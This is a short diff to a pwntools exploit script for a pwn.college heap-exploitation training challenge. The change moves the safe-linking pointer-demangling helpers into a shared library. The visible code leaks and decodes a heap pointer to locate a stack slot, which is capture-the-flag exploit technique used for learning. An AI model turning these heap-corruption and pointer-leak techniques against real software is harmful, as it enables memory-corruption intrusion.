@@ -1,15 +1,11 @@
-# Safely Stack Summoning
+# Dynamic Allocator Misuse - Safely Stack Summoning (Easy)
+# https://pwn.college/program-security/dynamic-allocator-misuse/level-18-0
 import pwn
-from dojotool import find_challenge
+from dojotool import find_challenge, protect_ptr
 from dojotool.pwntool import tee
 
 
 def one_round(io: pwn.process) -> None:
-    def protect_ptr(pos: int, ptr: int) -> int:
-        return (pos >> 12) ^ ptr
-
-    def reveal_ptr(pos: int, ptr: int) -> int:
-        return protect_ptr(pos, ptr)
 
     def read_puts(idx):
         io.sendline(b"puts %d" % idx)
@@ -49,7 +45,7 @@ def one_round(io: pwn.process) -> None:
     io.sendline(b"free 0")  # slot 0 now contain the address of rbp_free
 
     addr_free = read_int8(0)
-    addr_free = reveal_ptr(addr_heap, addr_free)
+    addr_free = protect_ptr(addr_heap, addr_free)
     pwn.info(f"addr_free: {hex(addr_free)}")
     addr_slot = addr_free + (rbp_free - 0x210)
     pwn.info(f"addr_slot: {hex(addr_slot)}")
